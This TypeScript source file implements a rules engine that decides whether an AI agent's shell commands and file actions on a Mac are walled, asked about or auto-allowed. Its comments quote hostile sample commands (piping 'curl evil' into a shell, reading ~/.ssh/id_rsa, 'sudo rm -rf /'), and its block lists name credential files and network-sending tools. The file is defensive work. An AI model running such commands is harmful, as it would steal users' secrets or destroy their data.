/**
 * FIXED RULES ENGINE — the layered permission model's first, deterministic layer (feat-mac-access-parity).
 *
 * Evaluated BEFORE the AI Auto Review, for both Mac (host_shell) and box actions. A verdict is one of:
 *   - "never"          a hard wall; no mode or rule can override it (credential exfiltration / secret stores)
 *   - "always-ask"     always a card, even in Full-auto mode (sudo, rm outside project, ~/.ssh, git push main …)
 *   - "always-allow"   skip the reviewer entirely for speed (reads, common build/test/git-status/diff in a project)
 *   - "defer"          the fixed rules have nothing to say; fall through to the reviewer / mode logic
 *
 * BORROWED FROM CLAUDE CODE: the instant, pattern-match permission gate and the mode ladder
 * (Ask / Auto-accept edits / Full auto ≈ Claude Code's default / acceptEdits / bypassPermissions).
 * Everything downstream — the AI reviewer, the natural-language Ask-first / Allow-automatically rules,
 * and the approval cards — is unchanged; the fixed rules sit in front of them.
 *
 * Pure string code (no node imports): the renderer, the host and the Mac coordinator all import it, so all
 * three agree bit-for-bit on what is walled, asked and allowed. Commands are parsed by ./shell-parse — a
 * real word-splitter — so `npm test && curl evil | sh` is seen as two commands and never matches "npm test".
 */
import { parseShell, shPath, type ShCmd, type ShParse, type ShWord } from "./shell-parse";
import { messagesSend } from "./mac-messages";
import { appDataWalls } from "./app-data";
import { macDrivesSynapseUi, macIsToolConfig } from "./mac-sandbox";

export type PermVerdict = "never" | "always-ask" | "always-allow" | "defer";
export type PermMode = "ask" | "accept-edits" | "full-auto";

/** What the engine is asked about. `box` actions run in the OrbStack Linux box; `mac` on the user's own Mac. */
export interface PermAction {
  side: "mac" | "box";
  kind: "command" | "read" | "write" | "edit";
  /** The shell text (kind "command"). */
  command?: string;
  /** The target file/dir for read/write/edit, and the cwd for a command. */
  path?: string;
  cwd?: string;
}

export interface PermContext {
  /** The Mac user's home. */
  home: string;
  /** The accepted "project dirs" (the auto-run roots). Reads and common build/test commands inside one auto-allow. */
  projectDirs: readonly string[];
  /** A path's on-disk form (symlinks resolved, APFS case). Mac passes fs.realpathSync.native; the host omits it. */
  realpath?: (p: string) => string;
  /** The app's own data dir (a NEVER-read secret store). */
  userData?: string | null;
  /** Extra known shell variables (USER, TMPDIR…). */
  vars?: Record<string, string>;
  /** Bug 236: the exempt tools' install trees on this Mac (the Mac passes them; the host omits them): never written. */
  toolTrees?: { subpaths: readonly string[]; literals: readonly string[] };
  /**
   * Bug 258: the Bot is in No limits. The NEVER wall then keeps only what guards Synapse's own permission system — the
   * app's data (the policy key and the signed policy files) and the keychain; private keys and credential files open.
   */
  noLimits?: boolean;
}

export interface PermResult {
  verdict: PermVerdict;
  /** The stable rule id that fired (for the card's "why", the log, and the guard tests). */
  rule: string;
  /** One line for the approval card: why it paused. */
  reason: string;
  /** For "always-allow": nothing. For a card: a SPECIFIC pattern the "Always allow" button can propose. */
  proposedRule?: string;
}

const R = (verdict: PermVerdict, rule: string, reason: string, proposedRule?: string): PermResult => ({ verdict, rule, reason, ...(proposedRule ? { proposedRule } : {}) });

// ---------------------------------------------------------------------------------------------------------------
// Path helpers (lexical + folded; symlink-resolved when a realpath is given).
// ---------------------------------------------------------------------------------------------------------------
/** APFS folds case and Unicode: ſ→s, K(Kelvin)→k. Applied to Mac paths so ~/.SSH matches ~/.ssh. */
export function permFold(p: string): string {
  return p.normalize("NFKC").toUpperCase().toLowerCase().normalize("NFKC");
}
function lexical(p: string, base: string): string {
  const abs = p.startsWith("/") ? p : `${base.replace(/\/+$/, "")}/${p}`;
  const out: string[] = [];
  for (const seg of abs.split("/")) {
    if (!seg || seg === ".") continue;
    if (seg === "..") out.pop();
    else out.push(seg);
  }
  return `/${out.join("/")}`;
}
const within = (p: string, dir: string): boolean => dir !== "/" && (p === dir || p.startsWith(`${dir}/`));

/** Real on-disk path: realpath of the deepest existing ancestor + the missing tail. Lexical when no realpath. */
function realOf(abs: string, realpath?: (p: string) => string): string {
  if (!realpath) return abs;
  const tail: string[] = [];
  let cur = abs;
  for (;;) {
    try { return lexical([realpath(cur), ...tail].join("/"), "/"); } catch { /* missing: walk up */ }
    if (cur === "/") return abs;
    tail.unshift(cur.slice(cur.lastIndexOf("/") + 1));
    cur = cur.slice(0, cur.lastIndexOf("/")) || "/";
  }
}

// ---------------------------------------------------------------------------------------------------------------
// The NEVER wall — credential exfiltration and secret stores. Not overridable by any mode or saved rule.
// "Almost nothing is a hard NEVER" (user's decision): only dumping the keychain, reading/copying private keys
// out, and reading the app's own vault / secret stores.
// ---------------------------------------------------------------------------------------------------------------
// A hard NEVER is narrow (the user's decision): a private-KEY file, a whole key-store copied out, the keychain, or
// the app's own vault. Reading an ordinary non-key file inside ~/.ssh (config, known_hosts) is NOT never — it falls
// through to the reviewer / a card.
/** Directories where EVERY file is a secret (reading any path within is exfil). */
const SECRET_WITHIN_DIRS = [".gnupg", ".password-store"];
/** Whole key-STORES: copying the directory itself exfiltrates every key in it (but individual non-key files are fine). */
const SECRET_STORE_ROOTS = [".ssh"];
/** Credential FILES that are secret whatever their extension. */
const SECRET_CRED_FILES = [".aws/credentials", ".config/gh/hosts.yml", ".docker/config.json", ".netrc", ".kube/config"];
const SECRET_ABS = ["/library/keychains", "/system/library/keychains"];
const SECRET_HOME_DIRS = ["library/keychains"];
/** A private-key / secret file anywhere (by name), read or copied out. */
const SECRET_FILE = /(^|\/)(id_(rsa|dsa|ecdsa|ed25519|xmss)|[^/]*\.(pem|key|p12|pfx|keychain|keychain-db|kdbx|ppk|jks)|secring\.gpg)$/i;

/** Detects `security dump-keychain` / `security find-*-password` / `security export`. */
function isKeychainRead(c: ShCmd): boolean {
  if (c.program !== "security") return false;
  const sub = c.argv.slice(1).find((w) => !w.text.startsWith("-"))?.text ?? "";
  return /^(dump-keychain|find-generic-password|find-internet-password|find-certificate|export|find-key)$/.test(sub) || c.argsUnknown || sub === "";
}
/** Detects `gpg --export-secret-keys` and friends. */
function isSecretKeyExport(c: ShCmd): boolean {
  if (!/^gpg2?$/.test(c.program)) return false;
  return c.argv.some((w) => /--export-secret(-subkeys)?-?keys?|^-a$/.test(w.text)) && c.argv.some((w) => /export-secret/.test(w.text));
}

/** The store name when this absolute path is credential exfiltration (NEVER), or null. Narrow by design. */
function secretExfil(abs: string, home: string, userData: string | null, noLimits = false): string | null {
  const f = permFold(abs);
  const h = permFold(lexical(home, "/"));
  if (appDataWalls(userData).some((u) => within(f, permFold(lexical(u, "/"))))) return "the app's own data";
  for (const d of SECRET_ABS) if (within(f, d)) return "the keychain";
  for (const d of SECRET_HOME_DIRS) if (within(f, `${h}/${d}`)) return "the keychain";
  if (noLimits) return null; // bug 258: private keys and credential files are the user's to open in No limits
  if (SECRET_FILE.test(f)) return "a private key";
  for (const d of SECRET_WITHIN_DIRS) if (within(f, `${h}/${d}`)) return `~/${d}`;        // every file in the store is a secret
  for (const d of SECRET_STORE_ROOTS) if (f === `${h}/${d}`) return `~/${d}`;            // copying the whole key store
  for (const d of SECRET_CRED_FILES) { const t = `${h}/${d}`; if (f === t) return `~/${d}`; }
  return null;
}
/** True when the path is a protected store (used by write/edit walls; broader than the NEVER read). */
function isProtectedStore(abs: string, home: string, userData: string | null): boolean {
  const f = permFold(abs);
  const h = permFold(lexical(home, "/"));
  if (appDataWalls(userData).some((u) => within(f, permFold(lexical(u, "/"))))) return true;
  for (const d of SECRET_ABS) if (within(f, d)) return true;
  return false;
}

/** A NEVER match for one parsed command (reads of secret stores, keychain dumps, secret-key exports). */
function neverForCommand(c: ShCmd, ctx: PermContext): PermResult | null {
  if (isKeychainRead(c)) return R("never", "never.keychain", "Reading the macOS keychain would expose stored passwords and keys.");
  if (isSecretKeyExport(c) && !ctx.noLimits) return R("never", "never.secret-key-export", "Exporting private keys off the machine is never allowed.");
  // Any read of a secret file/dir by a reading program, or as a path argument that leaves the machine.
  const readers = /^(cat|bat|less|more|head|tail|nl|od|xxd|hexdump|strings|cp|scp|rsync|ditto|tar|base64|openssl|pbcopy|dd|gpg2?|ssh-keygen|plutil|defaults|sqlite3|gzip|zip|shasum|md5)$/;
  const netSenders = /^(curl|wget|nc|ncat|netcat|socat|ftp|tftp|telnet|sftp|scp|mail|sendmail|mutt|ssh)$/;
  const looksReader = readers.test(c.program) || netSenders.test(c.program) || c.program === "";
  if (!looksReader) return null;
  for (const w of c.argv.slice(1)) {
    if (w.text.startsWith("-")) continue;
    const abs = shPath(w, c.cwd, ctx.home);
    if (!abs) continue;
    for (const p of [abs, realOf(abs, ctx.realpath)]) {
      const store = secretExfil(p, ctx.home, ctx.userData ?? null, ctx.noLimits === true);
      if (store) return R("never", "never.read-secret", `Reading ${store} would expose credentials.`);
    }
  }
  return null;
}

/** The NEVER wall for a plain file read/copy (ExternalRead, CopyToBox source). */
function neverForRead(abs: string, ctx: PermContext): PermResult | null {
  for (const p of [abs, realOf(abs, ctx.realpath)]) {
    const store = secretExfil(p, ctx.home, ctx.userData ?? null, ctx.noLimits === true);
    if (store) return R("never", "never.read-secret", `Reading ${store} would expose credentials.`);
  }
  return null;
}

// ---------------------------------------------------------------------------------------------------------------
// ALWAYS ASK — risky, but overridable only by an explicit approval card (never skipped by Full-auto mode).
// ---------------------------------------------------------------------------------------------------------------
const SUDO = /^(sudo|doas|sudoedit|run0|pkexec)$/;
const SHELL_CONFIG_FILES = [".zshrc", ".zshenv", ".zprofile", ".zlogin", ".zlogout", ".bashrc", ".bash_profile", ".bash_login", ".profile", ".inputrc", ".bash_logout"];
/** Protected places touching them = a card, even to write/edit (not read — reads of non-secret configs are fine). */
const PROTECTED_WRITE_DIRS = [".ssh", ".gnupg", ".aws", ".config/gh", ".docker", ".kube", "library/launchagents", "library/keychains"];
const PROTECTED_ABS = ["/library/launchagents", "/library/launchdaemons", "/etc"];

/** git subcommand + args from a parsed command (git -C x push …). */
function gitInvocation(c: ShCmd): { sub: string; args: string[] } | null {
  if (c.program !== "git" && c.program !== "hub") return null;
  const rest = c.argv.slice(1).map((w) => w.text);
  let i = 0;
  while (i < rest.length && rest[i]!.startsWith("-")) {
    if (/^(-C|-c|--git-dir|--work-tree|--namespace|--exec-path)$/.test(rest[i]!)) i += 2;
    else i++;
  }
  if (i >= rest.length) return null;
  return { sub: rest[i]!, args: rest.slice(i + 1) };
}

const DEFAULT_BRANCHES = new Set(["main", "master", "trunk", "production", "prod", "release", "HEAD"]);

/** ALWAYS-ASK for one parsed command. */
function askForCommand(c: ShCmd, ctx: PermContext): PermResult | null {
  const prog = c.program;
  // A command whose program is run from stdin/pipe, or whose args are unknown (xargs/find -exec of a risky prog),
  // is handled by its own ShCmd entry; here we only judge this entry.
  if (SUDO.test(prog) || c.wrappers.some((w) => SUDO.test(w))) return R("always-ask", "ask.sudo", "This runs with administrator (sudo) privileges.");

  // mac-keychain-guard: reads of the keychain are NEVER (above); everything else `security` does — listing identities
  // for signing, adding a trusted cert — touches the keychain, so it always asks.
  if (prog === "security") return R("always-ask", "ask.security-tool", "This uses the macOS keychain tool (security).");

  // Pipe-to-shell installs: curl|sh, wget|sh, `sh -c "$(curl …)"` (the second command reads its program from a pipe/subst).
  if (c.programFromInput && (c.stdin === "pipe" || c.stdin === "procsubst")) {
    return R("always-ask", "ask.pipe-to-shell", "This pipes downloaded content straight into a shell or interpreter.");
  }

  // git push to a default branch, or a force push.
  const git = gitInvocation(c);
  if (git && git.sub === "push") {
    const force = git.args.some((a) => a === "--force" || a === "-f" || a.startsWith("--force-with-lease") || a === "+HEAD" || /^\+/.test(a));
    if (force) return R("always-ask", "ask.git-push-force", "A force push can overwrite history on the remote.");
    const toDefault = git.args.some((a) => DEFAULT_BRANCHES.has(a) || DEFAULT_BRANCHES.has(a.split(":").pop() ?? "")) ||
      // `git push` / `git push origin` with no branch pushes the current branch, which may be main: ask.
      git.args.filter((a) => !a.startsWith("-")).length <= 1;
    if (toDefault) return R("always-ask", "ask.git-push-main", "This pushes to a shared or default branch (main/master).");
  }
  if (git && (git.sub === "reset" && git.args.includes("--hard")) ) return R("always-ask", "ask.git-hard-reset", "A hard reset discards uncommitted work.");
  if (git && /^(filter-branch|filter-repo)$/.test(git.sub)) return R("always-ask", "ask.git-history-rewrite", "Rewriting history can destroy commits.");

  // rm / rmdir / unlink / shred outside a project dir, or with a dangerous root/home target.
  if (/^(rm|rmdir|unlink|shred|srm|trash)$/.test(prog)) {
    for (const w of c.argv.slice(1)) {
      if (w.text.startsWith("-")) continue;
      const abs = w.dynamic || w.glob ? null : shPath(w, c.cwd, ctx.home);
      if (!abs) return R("always-ask", "ask.rm-unclear", "This deletes files at a path that can't be checked ahead of time.");
      const real = realOf(abs, ctx.realpath);
      if (!inAnyProject(abs, ctx) && !inAnyProject(real, ctx)) return R("always-ask", "ask.rm-outside-project", "This deletes files outside your project folders.");
    }
  }
  // A whole-tree delete of a project dir root or home is still a card even inside a project.
  if (/^(rm)$/.test(prog) && c.argv.some((w) => /r/.test(w.text) && w.text.startsWith("-"))) {
    for (const w of c.argv.slice(1)) {
      if (w.text.startsWith("-") || w.dynamic || w.glob) continue;
      const abs = shPath(w, c.cwd, ctx.home);
      if (abs && (abs === permHome(ctx) || abs === "/" || ctx.projectDirs.some((d) => lexical(d, "/") === abs))) return R("always-ask", "ask.rm-root", "This deletes a whole project or home folder.");
    }
  }

  // Writes/edits to shell rc files, LaunchAgents, ~/.ssh, keychains, /etc: a card.
  const writers = /^(tee|dd|install|cp|mv|ln|truncate|chmod|chown|chflags|touch|sed|perl|awk|patch|defaults|launchctl|crontab|plutil|pmset|nvram|systemsetup|scutil|networksetup|spctl|csrutil)$/;
  const isWriter = writers.test(prog) || c.redirects.some((r) => />/.test(r.op));
  if (prog === "launchctl" || prog === "crontab") return R("always-ask", "ask.persistence", "This changes startup items or scheduled jobs.");
  if (isWriter) {
    const targets: string[] = [];
    for (const r of c.redirects) if (/>/.test(r.op) && r.target && !r.target.dynamic) { const a = shPath(r.target, c.cwd, ctx.home); if (a) targets.push(a); }
    for (const w of c.argv.slice(1)) { if (w.text.startsWith("-") || w.dynamic) continue; const a = shPath(w, c.cwd, ctx.home); if (a) targets.push(a); }
    for (const abs of targets) {
      const hit = protectedWrite(abs, ctx) || protectedWrite(realOf(abs, ctx.realpath), ctx);
      if (hit) return hit;
    }
  }

  // Editing shell config via an editor is also a card.
  if (/^(vi|vim|nvim|nano|emacs|ed|code|open)$/.test(prog)) {
    for (const w of c.argv.slice(1)) {
      if (w.text.startsWith("-") || w.dynamic) continue;
      const a = shPath(w, c.cwd, ctx.home);
      if (a) { const hit = protectedWrite(a, ctx) || protectedWrite(realOf(a, ctx.realpath), ctx); if (hit) return hit; }
    }
  }
  return null;
}

function permHome(ctx: PermContext): string { return lexical(ctx.home, "/"); }

/** A protected write target → an always-ask result, or null. */
function protectedWrite(abs: string, ctx: PermContext): PermResult | null {
  const f = permFold(abs);
  const h = permFold(permHome(ctx));
  const tail = f.startsWith(h + "/") ? f.slice(h.length + 1) : "";
  for (const name of SHELL_CONFIG_FILES) if (tail === name.toLowerCase()) return R("always-ask", "ask.shell-rc", "This changes a shell startup file, which runs on every new terminal.");
  if (within(f, `${h}/library/launchagents`) || within(f, "/library/launchagents") || within(f, "/library/launchdaemons")) return R("always-ask", "ask.persistence", "This changes startup items.");
  // Bug 237: settings a program run outside the sandbox reads (Claude's settings/hooks, Codex's config, git's global
  // config): always a card, in every mode (policy.ts makes it strict for the app-side write/edit too).
  if (macIsToolConfig(f, h)) return R("always-ask", "ask.tool-config", "This changes settings that Claude, Codex or git read when they run outside the command sandbox.");
  // Bug 236: the programs that run outside the command sandbox (claude, codex, npx…), their install trees, the files
  // that would shadow them in a search dir, and their interpreters' dirs are never written by a Bot — not by a shell
  // command (the sandbox denies it) and not by the app-side write/edit, which runs outside the sandbox.
  const trees = ctx.toolTrees;
  if (trees && (trees.literals.some((p) => f === permFold(p)) || trees.subpaths.some((p) => within(f, permFold(p))))) {
    return R("never", "never.exempt-tool", "Changing a program that runs outside this Mac's command sandbox (or its install folder) is never allowed.");
  }
  if (/^\/etc\/(zshrc|zprofile|zshenv|profile|bashrc|paths|paths\.d)/.test(f) || f === "/etc/hosts" || within(f, "/etc/sudoers.d") || f === "/etc/sudoers") return R("always-ask", "ask.system-config", "This changes a system configuration file.");
  for (const d of PROTECTED_WRITE_DIRS) if (within(f, `${h}/${d}`)) return R("always-ask", "ask.protected-dir", "This writes into a protected folder (keys, credentials or startup items).");
  for (const d of PROTECTED_ABS) if (within(f, d)) return R("always-ask", "ask.system-dir", "This writes into a protected system folder.");
  return null;
}

// ---------------------------------------------------------------------------------------------------------------
// ALWAYS ALLOW — reads, and common build/test/git-status/diff commands inside a project dir. Skips the reviewer.
// ---------------------------------------------------------------------------------------------------------------
/** git subcommands that only report (no writes, no network). */
const GIT_READONLY = new Set(["status", "diff", "log", "show", "branch", "remote", "rev-parse", "describe", "blame", "shortlog", "config", "ls-files", "ls-tree", "cat-file", "rev-list", "reflog", "tag", "whatchanged", "grep", "stash"]);
/** Read-only Unix programs (no flags that write/execute). */
const READ_PROGRAMS = new Set(["cat", "bat", "head", "tail", "less", "more", "nl", "wc", "ls", "tree", "stat", "file", "du", "df", "pwd", "realpath", "readlink", "basename", "dirname", "echo", "printf", "date", "whoami", "id", "hostname", "uname", "sw_vers", "which", "type", "env", "printenv", "true", "false", "sleep", "seq", "test", "grep", "egrep", "fgrep", "rg", "ag", "ack", "find", "fd", "sort", "uniq", "cut", "tr", "column", "comm", "join", "paste", "diff", "cmp", "jq", "yq", "cksum", "md5", "md5sum", "shasum", "sha256sum", "sha1sum", "b2sum", "wc", "man", "tldr", "history", "uptime", "sysctl", "vm_stat", "top", "ps", "arch"]);
/** Build/test/dev commands (with their read-only or build/test subcommands) that auto-allow inside a project. */
const BUILD_COMMANDS: Record<string, { any?: boolean; subs?: Set<string> }> = {
  npm: { subs: new Set(["test", "run", "ci", "install", "i", "ls", "list", "outdated", "audit", "why", "exec", "start", "build", "lint", "prune", "dedupe", "view", "version", "pack"]) },
  pnpm: { subs: new Set(["test", "run", "install", "i", "build", "lint", "list", "why", "exec", "start", "dlx", "audit", "outdated"]) },
  yarn: { any: true },
  bun: { subs: new Set(["test", "run", "install", "i", "build", "x", "add", "outdated", "pm"]) },
  npx: { any: true },
  node: { any: true }, deno: { any: true }, tsc: { any: true }, tsx: { any: true }, "ts-node": { any: true },
  make: { any: true }, cmake: { any: true }, cargo: { subs: new Set(["build", "test", "check", "run", "clippy", "fmt", "doc", "tree", "metadata", "bench", "update", "add"]) },
  go: { subs: new Set(["build", "test", "run", "vet", "fmt", "mod", "list", "doc", "env", "version", "get", "tool", "generate"]) },
  python: { any: true }, python3: { any: true }, pip: { any: true }, pip3: { any: true }, pytest: { any: true }, poetry: { any: true }, uv: { any: true }, ruff: { any: true }, black: { any: true }, mypy: { any: true }, tox: { any: true },
  pytest3: { any: true }, gradle: { any: true }, "./gradlew": { any: true }, mvn: { any: true }, rake: { any: true }, bundle: { any: true }, rails: { any: true },
  vitest: { any: true }, jest: { any: true }, mocha: { any: true }, eslint: { any: true }, prettier: { any: true }, tap: { any: true }, ava: { any: true }, playwright: { any: true }, cypress: { any: true },
  swift: { subs: new Set(["build", "test", "run", "package"]) }, xcodebuild: { any: true }, dotnet: { any: true },
  git: {}, // handled specially (GIT_READONLY)
};

function permFoldedRoots(ctx: PermContext): string[] {
  return ctx.projectDirs.filter((d) => typeof d === "string" && d.startsWith("/")).map((d) => permFold(lexical(d, "/")));
}
function inAnyProject(abs: string, ctx: PermContext): boolean {
  const f = permFold(abs);
  return permFoldedRoots(ctx).some((r) => within(f, r) || f === r);
}
/** Every path/redirect argument stays inside a project dir. */
function argsInProject(c: ShCmd, ctx: PermContext): boolean {
  const cwdOk = c.cwd ? inAnyProject(c.cwd, ctx) : false;
  if (!cwdOk) return false;
  for (const r of c.redirects) {
    if (!/>/.test(r.op)) continue;
    if (!r.target || r.target.dynamic) return false;
    const a = shPath(r.target, c.cwd, ctx.home);
    if (!a || (!inAnyProject(a, ctx) && !inAnyProject(realOf(a, ctx.realpath), ctx))) return false;
  }
  for (const w of c.argv.slice(1)) {
    if (w.dynamic) continue; // a $VAR arg means we can't prove it stays in-project → don't fast-path (falls to reviewer)
    if (w.text.startsWith("-") || !looksPathish(w)) continue;
    const a = shPath(w, c.cwd, ctx.home);
    if (a && !inAnyProject(a, ctx) && !inAnyProject(realOf(a, ctx.realpath), ctx)) return false;
  }
  return true;
}
/** Whether a word looks like it names a path (so a stray URL or flag value isn't misread). */
function looksPathish(w: ShWord): boolean {
  const t = w.text;
  return t.startsWith("/") || t.startsWith("./") || t.startsWith("../") || t.startsWith("~") || (t.includes("/") && !/^[a-z]+:\/\//i.test(t));
}

/** ALWAYS-ALLOW for one parsed command, or null. Conservative: any doubt → null (defer to reviewer). */
function allowForCommand(c: ShCmd, ctx: PermContext): PermResult | null {
  if (c.programFromInput || c.argsUnknown || c.stdin === "pipe") return null;
  if (c.redirects.some((r) => r.heredoc !== null)) return null;
  const prog = c.program;
  if (!prog) return null;
  // A read-only program, args inside a project (or no path args at all): allow.
  const git = gitInvocation(c);
  if (prog === "git" || prog === "hub") {
    if (!git) return null;
    if (!GIT_READONLY.has(git.sub)) return null;
    if (git.sub === "config" && git.args.some((a) => !a.startsWith("-") && !/^(--get|--list|-l|-e|--show-origin)/.test(a) && !/\./.test(a))) return null;
    if (git.sub === "config" && git.args.filter((a) => !a.startsWith("-")).length > 1) return null; // a set, not a get
    if (git.sub === "stash" && !(git.args.length === 0 || git.args[0] === "list" || git.args[0] === "show")) return null;
    if (!argsInProject(c, ctx)) return null;
    return R("always-allow", "allow.git-readonly", "");
  }
  if (READ_PROGRAMS.has(prog)) {
    // find/grep can execute (-exec/-delete): those become their own ShCmd entries, so if this one still says
    // find, it had none. Reject a couple of writing flags defensively.
    if (prog === "find" && c.argv.some((w) => /^-(delete|fprint|fprintf|fls)$/.test(w.text))) return null;
    return argsInProject(c, ctx) || noPathArgs(c) ? R("always-allow", "allow.read", "") : null;
  }
  const build = BUILD_COMMANDS[prog];
  if (build) {
    if (!build.any) { const sub = c.argv.slice(1).find((w) => !w.text.startsWith("-"))?.text; if (!sub || !build.subs?.has(sub)) return null; }
    return argsInProject(c, ctx) ? R("always-allow", "allow.build", "") : null;
  }
  return null;
}
function noPathArgs(c: ShCmd): boolean {
  return !c.argv.slice(1).some((w) => looksPathish(w)) && !c.redirects.some((r) => />/.test(r.op));
}

// ---------------------------------------------------------------------------------------------------------------
// The public entry point.
// ---------------------------------------------------------------------------------------------------------------
/**
 * Evaluate the fixed rules for one action. Precedence: NEVER, then ALWAYS-ASK, then ALWAYS-ALLOW, else DEFER.
 * NEVER and ALWAYS-ASK win over ALWAYS-ALLOW even in the same command, so `cat notes && cat ~/.ssh/id_rsa`
 * is NEVER, and `npm test && sudo rm -rf /` is ALWAYS-ASK.
 */
/**
 * Bug 225: the app's own data folder holds the permission key (local-policy.key) and the signed permission files, with
 * no keychain around them. A command that so much as NAMES that folder or the key — in any program, quoted, via cd, in
 * a python/osascript string — is a NEVER (the executor also runs every command in a sandbox that denies the folder).
 */
function namesOwnData(command: string, ctx: PermContext): boolean {
  if (!ctx.userData) return false;
  const text = permFold(command.replace(/['"\\]/g, ""));
  if (text.includes("local-policy.key")) return true;
  // Bug 285: the folder under both names (…/Synapse and an install's old …/Bots).
  const forms = new Set(appDataWalls(ctx.userData).flatMap((u) => { const ud = lexical(u, "/"); return [ud, realOf(ud, ctx.realpath)]; }).map((p) => permFold(p)));
  const home = permFold(lexical(ctx.home, "/"));
  for (const f of [...forms]) if (f.startsWith(`${home}/`)) { forms.add(`~${f.slice(home.length)}`); forms.add(`$home${f.slice(home.length)}`); forms.add(`\${home}${f.slice(home.length)}`); }
  // Bug 229: the folder matches as whole path segments only — "…/Synapse", "…/Synapse/x" — never a prefix like "SynapseSync".
  // Before it: the start of the text or a character that can't be inside a path word; after it: the end, a "/" or one.
  const esc = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const edge = "[\\s;|&()<>`,:=*?\\[]";
  for (const f of forms) {
    const tail = f.split("/").slice(-2).join("/"); // e.g. "application support/synapse": a cd-then-relative spelling
    const lead = f.startsWith("/") || f.startsWith("~") || f.startsWith("$") ? `(?:^|${edge})` : `(?:^|/|${edge})`;
    if (new RegExp(`${lead}${esc(f)}(?:$|/|${edge})`).test(text)) return true;
    if (tail.includes("/") && new RegExp(`(?:^|/|${edge})${esc(tail)}(?:$|/|${edge})`).test(text)) return true;
  }
  return false;
}

export function evaluateFixedRules(action: PermAction, ctx: PermContext): PermResult {
  if (action.kind === "command") {
    if (namesOwnData(action.command ?? "", ctx)) return R("never", "never.app-data", "Reading or changing the app's own data (its permission key and records) is never allowed.");
    // Fix round (review of bug 258): a Bot may never drive Synapse's own app (its approval cards, its settings, the No
    // limits confirm). A hard NEVER in every mode, No limits included.
    if (action.side === "mac" && macDrivesSynapseUi(action.command ?? "")) return R("never", "never.synapse-ui", "Driving Synapse's own app is never allowed.");
    const parse: ShParse = parseShell(action.command ?? "", { cwd: action.cwd ?? ctx.projectDirs[0] ?? ctx.home, home: ctx.home, vars: ctx.vars });
    // A word-splitting failure (unterminated quote, opaque zsh construct, computed program name) → always-ask:
    // we could not prove what runs.
    // The box is a disposable Linux container with its own reviewer and static analysis (host/review/*). The fixed
    // rules give it only the NEVER wall (secret exfiltration) here and otherwise DEFER, so the box's existing gate is
    // unchanged. The ALWAYS-ASK filesystem/sudo/git walls and the ALWAYS-ALLOW fast path are for the user's own Mac.
    const mac = action.side === "mac";
    let neverHit: PermResult | null = null;
    let askHit: PermResult | null = null;
    let allAllow = mac && parse.cmds.length > 0 && parse.opaque.length === 0;
    for (const c of parse.cmds) {
      const nv = neverForCommand(c, ctx);
      if (nv) { neverHit = nv; break; }
      if (!mac) continue;
      const ak = askForCommand(c, ctx);
      if (ak && !askHit) askHit = ak;
      if (ak) allAllow = false;
      if (allAllow && !allowForCommand(c, ctx)) allAllow = false;
    }
    if (neverHit) return neverHit;
    if (!mac) return R("defer", "defer", "");
    // Bug 142: a Messages send (iMessage / SMS as the user) is always a card, naming who gets what.
    const sms = messagesSend(action.command ?? "");
    if (sms) return R("always-ask", "ask.messages-send", `This sends a message as you to ${sms.recipient}: “${sms.text.slice(0, 300)}”.`);
    if (askHit) return askHit;
    if (parse.opaque.length > 0) return R("always-ask", "ask.unparseable", `This command can't be fully checked ahead of time (${parse.opaque[0]}).`, proposeExact(action));
    if (allAllow) return { verdict: "always-allow", rule: "allow.command", reason: "" };
    return R("defer", "defer", "");
  }
  // read / write / edit of a single path.
  const base = action.cwd ?? ctx.projectDirs[0] ?? ctx.home;
  const abs = lexical((action.path ?? "").replace(/^~(?=$|\/)/, ctx.home), base);
  if (action.kind === "read") {
    const nv = neverForRead(abs, ctx);
    if (nv) return nv;
    return action.side === "mac" ? R("always-allow", "allow.read-file", "") : R("defer", "defer", "");
  }
  // write / edit. The box's own gate handles box writes; the fixed rules give the box only the NEVER wall.
  if (isProtectedStore(abs, ctx.home, ctx.userData ?? null)) return R("never", "never.write-secret-store", "Writing into the keychain or the app's own data is never allowed.");
  if (action.side !== "mac") return R("defer", "defer", "");
  const hit = protectedWrite(abs, ctx) ?? protectedWrite(realOf(abs, ctx.realpath), ctx);
  if (hit) return hit;
  if (action.kind === "edit" && inAnyProject(abs, ctx)) return R("always-allow", "allow.edit-in-project", "");
  return R("defer", "defer", "");
}

/** The specific "Always allow" pattern a card proposes for an unparseable/ordinary command (never "allow all"). */
function proposeExact(action: PermAction): string | undefined {
  const cmd = (action.command ?? "").trim();
  if (!cmd || cmd.length > 400 || /[\n\r]/.test(cmd)) return undefined;
  const where = action.cwd ? ` in ${action.cwd}` : "";
  return `Allow the exact command “${cmd}”${where}`;
}
